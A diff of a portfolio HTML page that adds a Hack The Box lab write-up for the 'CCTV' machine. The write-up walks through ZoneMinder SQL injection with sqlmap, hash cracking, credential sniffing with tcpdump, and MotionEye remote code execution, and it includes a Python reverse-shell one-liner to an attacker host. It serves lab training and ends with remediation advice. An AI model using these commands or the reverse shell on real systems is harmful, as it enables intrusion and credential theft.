@@ -5,7 +5,6 @@
   <meta charset="utf-8" />
   <meta content="width=device-width, initial-scale=1.0" name="viewport" />
   <title>HTB Writeup - CCTV</title>
-  <link href="../../assets/Icone.png" rel="icon" type="image/png" />
   <script>
     (function () {
       const THEME_STORAGE_KEY = 'portfolio-theme';
@@ -38,7 +37,7 @@
 </head>
 
 <body class="challenge-body">
-  <header class="challenge-hero">
+    <header class="challenge-hero" style="position: relative;">
     <div style="position: absolute; top: 1.5rem; right: 2rem; z-index: 10;">
       <button aria-label="Switch to light mode" class="theme-toggle" data-theme-toggle="" type="button">
         <span class="theme-track">
@@ -55,7 +54,7 @@
       <div class="challenge-meta">
 
         <div class="challenge-icon-container">
-          <img alt="Facts Machine Icon" class="challenge-icon" src="./assets/machine_image.png" />
+          <img alt="CCTV Machine Icon" class="challenge-icon" src="./assets/machine_image.png" />
         </div>
         <div>
           <span class="meta-label">Difficulty</span>
@@ -81,27 +80,274 @@
   <main class="challenge-main">
     <section aria-labelledby="overview-title" class="card section-overview">
       <header class="section-heading">
-        <p class="eyebrow">Disclaimer </p>
-        <h2 id="overview-title">Disclaimer</h2>
+        <p class="eyebrow">Summary </p>
+        <h2 id="overview-title">Machine Overview</h2>
       </header>
       <p>
-        <strong>Due to Hack The Box rules, we cannot share write-ups or solutions for active machines. Write-ups will be
-          published once the machines are retired.</strong>
+  CCTV is an easy Linux machine focused on web exploitation, credential compromise, internal service enumeration, traffic interception, and privilege escalation through vulnerable surveillance software.
       </p>
     </section>
 
+    <section aria-labelledby="description-title" class="card section-description">
+      <header class="section-heading">
+        <p class="eyebrow">Pentesting Process</p>
+        <h2 id="description-title">Service Enumeration</h2>
+      </header>
+      <p>
+        The assessment begins with a service enumeration phase using <strong>Nmap</strong> to identify exposed services and determine their versions.
+      </p>
+      <p class="center-code">
+        <code class="language-bash">nmap -sC -sV 10.129.40.161</code>
+      </p>
+      <p>
+        The scan reveals two accessible services:
+      </p>
+      <p>
+      <pre class="terminal">
+              <code>
+Nmap scan report for 10.129.40.161
+Host is up (0.23s latency).
+Not shown: 989 closed ports
+PORT      STATE    SERVICE      VERSION
+22/tcp    open     ssh          OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+80/tcp    open     http         Apache httpd 2.4.58
+|_http-title: Did not follow redirect to http://cctv.htb/
+            </code></pre>
+      </p>
+      <p>
+        The web server redirects requests to the virtual host <code>cctv.htb</code>. To interact with the application correctly, the hostname was added to the local <code>/etc/hosts</code> file.
+      </p>
+      <p>
+        <code class="language-bash">echo "10.129.40.161  cctv.htb" >> /etc/hosts</code>
+      </p>
+      <header class="section-heading">
+        <h2 id="overview-title">ZoneMinder Enumeration & Exploitation</h2>
+      </header>
+      <p>The web application hosts a <strong>ZoneMinder</strong> instance. Default administrative credentials were still enabled, allowing authentication using <code>admin:admin</code>.</p>
+
+      <p>The server is running <strong>ZoneMinder 1.37.63</strong>, which is vulnerable to an SQL injection vulnerability identified as <strong>CVE-2024-51482</strong>.</p>
+      <p>The vulnerability exists in the way the application processes the <code>tid</code> parameter in the following request <a class="ref" href="#references">[1]</a>:</p>
+    
+    <p><pre class="terminal">
+GET /zm/index.php?view=request&request=event&action=removetag&tid=1 HTTP/1.1
+Host: cctv.htb
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: AddMonitorsTable.bs.table.searchText=; AddMonitorsTable.bs.table.pageNumber=1; zmControlTable.bs.table.hiddenColumns=%5B%22Id%22%5D; zmReportsTable.bs.table.searchText=; zmReportsTable.bs.table.pageNumber=1; zmSkin=classic; zmCSS=base; addMonitorsprobe_Manufacturer=; addMonitorsip=; addMonitorsprobe_username=; addMonitorsprobe_password=; ZMSESSID=1iei96ct6ugc18ms3no2grs20q
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+    </pre></p>
+    <p>The request was saved into a file named <code>request.txt</code> and used with <strong>SQLMap</strong> to automate exploitation of the SQL injection vulnerability.</p>
+
+      <p class="center-code">
+        <code class="language-bash">sqlmap -r request.txt -p tid</code>
+      </p>
+      <p>
+        SQLMap confirms that the <code>tid</code> parameter is vulnerable to a time-based blind SQL injection.
+      </p>
+      <p>
+      <pre class="terminal">
+              <code>
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.6.4#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+---
+Parameter: tid (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 7531 FROM (SELECT(SLEEP(5)))EFYr)
+---
+            </code></pre>
+      </p>
+      <p>Using the SQL injection vulnerability, the contents of the <code>Users</code> table were extracted from the <code>zm</code> database.</p>
+
+          <p class="center-code">
+        <code class="language-bash">sqlmap -r request.txt -D zm -T Users -C Username,Password --dump</code>
+      </p>
+      <p>
+        The dump reveals several password hashes for ZoneMinder users:
+      </p>
+      <p>
+      <pre class="terminal">
+              <code>
++------------+--------------------------------------------------------------+
+| Username   | Password                                                     |
++------------+--------------------------------------------------------------+
+| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
+| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
+| admin      | $2y$10$t5z8uIT.n9uCdHCNtsdfcfX7pP/jhygjZQ74AJ96IJ967wsdvilmA |
++------------+--------------------------------------------------------------+
+            </code></pre>
+      </p>
+
+      <header class="section-heading">
+        <h2 id="description-title">Credential Recovery</h2>
+      </header>
+
+      <p><strong>Hashcat</strong> was used to crack Mark's password hash.</p>
+    <p class="center-code">
+        <code class="language-bash">hashcat '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.' /usr/share/wordlists/rockyou.txt -m 3200</code>
+      </p>
+
+      <p>The recovered password for the user <strong>mark</strong> is <code>opensesame</code>. These credentials provide SSH access to the target system.</p>
+
+      <header class="section-heading">
+        <h2 id="description-title">Internal Service Enumeration</h2>
+      </header>
+      <p>After obtaining SSH access, internal services running on the host were enumerated.</p>
+
+          <p class="center-code">
+        <code class="language-bash">
+netstat -tlnp
+          </code>
+      </p>
+      <p>
+      <pre class="terminal">
+              <code>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8554          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:9081          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8765          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:1935          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:7999          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -  
+            </code></pre>
+      </p>
+      <p>The service listening on port <strong>8765</strong> appears to be a <strong>MotionEye</strong> instance.</p>
+
+          <p class="center-code">
+        <code class="language-bash">curl -I http://127.0.0.1:8765</code>
+      </p>
+      <p>
+      <pre class="terminal">
+              <code>
+HTTP/1.1 200 OK
+Server: motionEye/0.43.1b4
+Content-Type: text/html; charset=UTF-8
+Date: Mon, 09 Mar 2026 16:29:45 GMT
+Etag: "da39a3ee5e6b4b0d3255bfef95601890afd80709"
+Content-Length: 0
+            </code></pre>
+      </p>
+      <p>SSH local port forwarding was used to access the internal MotionEye service from the attacker machine.</p>
+      
+<p class="center-code">
+        <code class="language-bash">
+ssh mark@cctv.htb -L 8765:127.0.0.1:8765
+          </code>
+      </p>
+      <p>Access to the MotionEye interface requires authentication, and at this stage no valid credentials were available.</p>
+
+      <p>Running <strong>LinPEAS</strong> on the target system revealed that the binary <strong>/usr/bin/tcpdump</strong> had the <strong>CAP_NET_RAW</strong> capability assigned, allowing non-privileged users to capture raw network traffic.</p>
+
+<p>
+      <pre class="terminal">
+              <code>
+══╣ Processes with capability sets (non-zero CapEff/CapAmb, limit 40)
+
+/usr/bin/tcpdump cap_net_raw=eip
+
+            </code></pre>
+      </p>
+
+  <header class="section-heading">
+        <h2 id="description-title">Credential Interception</h2>
+      </header>
+
+      <p><strong>Tcpdump</strong> was used to capture local network traffic. SSH traffic and traffic associated with port <strong>8554</strong> were excluded to reduce noise and simplify analysis.</p>
+
+<p class="center-code">
+        <code class="language-bash">/usr/bin/tcpdump -i any -A 'tcp and not port 22 and not port 8554'</code>
+      </p>
+
+    <p>After monitoring the traffic for approximately three minutes, plaintext credentials for the user <strong>sa_mark</strong> were identified within captured TCP packets.</p>
+
+<p>
+      <pre class="terminal">
+              <code>
+16:21:54.212607 veth2e427a1 P   IP 172.25.0.11.59396 > 172.25.0.10.5000: Flags [P.], seq 1:52, ack 1, win 502, options [nop,nop,TS val 484461568 ecr 1997213995], length 51
+E..g..@.@..........
+.....b.w........X......
+..L.w..+USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=status
+            </code></pre>
+      </p>
+
+      <p>The recovered password was successfully used to authenticate to the <strong>MotionEye</strong> instance as the <code>admin</code> user.</p>
+
+      <header class="section-heading">
+        <h2 id="overview-title">MotionEye Exploitation</h2>
+      </header>
+      <p>The server is running <strong>MotionEye 0.43.1b4</strong>, which is vulnerable to a remote code execution vulnerability tracked as <strong>CVE-2025-60787</strong>.</p>
+      <p>A public PoC exploit for this vulnerability is available on GitHub <a class="ref" href="#references">[2]</a>.</p>
+      <p>The following payload was used to obtain a reverse shell on the target system:</p>
+<p class="center-code">
+        <code class="language-bash">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;ATTACKER_IP&gt;",&lt;ATTACKER_PORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</code>
+      </p>
+      <p>Successful exploitation resulted in remote code execution as the <strong>root</strong> user.</p>
+      <img src="./assets/root.png" width="50%"/>
+  </section>
+
+
     <section aria-labelledby="overview-title" class="card section-overview">
       <header class="section-heading">
-        <p class="eyebrow">Proof of Completion</p>
-        <h2 id="overview-title">Proof of Completion</h2>
+        <p class="eyebrow">Mitigation</p>
+        <h2 id="overview-title">Remediation</h2>
       </header>
+      <p>
+      The following remediation steps can help prevent exploitation of the identified vulnerabilities:
+      </p>
+      <ul>
+        <li>Upgrade ZoneMinder to version 1.37.65 or later.</li>
+        <li>Upgrade MotionEye to version 0.43.1b5 or later.</li>
+      </ul>
+    </section>
+
+    <section aria-labelledby="overview-title" class="card section-overview" id="references">
+      <header class="section-heading">
+        <p class="eyebrow">References</p>
+        <h2 id="overview-title">References</h2>
+      </header>
+
+      <ol type="1" style="list-style-type: none; counter-reset: ref-counter;">
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">1</span>]</span>
+          <a href="https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3"
+            target="_blank" rel="noopener noreferrer">
+            GitHub | Boolean-based SQL Injection in ZoneMinder v1.37.* &lt;= 1.37.64</a>
+        </li>
+
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">2</span>]</span>
+          <a href="https://github.com/advisories/GHSA-j945-qm58-4gjx"
+            target="_blank" rel="noopener noreferrer">
+            GitHub | MotionEye vulnerable to RCE via unsanitized motion config parameter </a>
+        </li>
+
+      </ol>
+    </section>
+
+    <section aria-labelledby="overview-title" class="card section-overview" id="references">
       <img src="./assets/machine_solved.png" width="100%"/>
     </section>
 
   </main>
 
   <footer class="challenge-footer">
-    <small>© <span id="current-year"></span> Yassine SABIR · CCTV</small>
+    <small>© <span id="current-year"></span> Yassine SABIR · Silentium</small>
   </footer>
 
   <script>
@@ -151,7 +397,6 @@
       });
     });
   </script>
-  <script src="../writeups_toc.js"></script>
 </body>
 
 </html>
